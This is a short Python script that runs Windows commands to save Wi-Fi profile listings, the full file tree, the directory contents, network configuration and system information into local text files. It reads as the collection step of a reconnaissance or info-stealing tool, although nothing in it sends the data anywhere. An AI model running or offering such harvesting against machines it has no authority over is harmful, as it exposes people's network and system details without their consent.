import os
os.system("mkdir netsh & netsh wlan show profile > netsh/profiles.txt & netsh wlan show profile * > netsh/profileView.txt & exit")
os.system("mkdir files & tree /F > files/tree.txt")
os.system("dir > files/folder.txt")
os.system("mkdir device & ipconfig /all > device/ip.txt")
os.system("systeminfo > device/system.txt")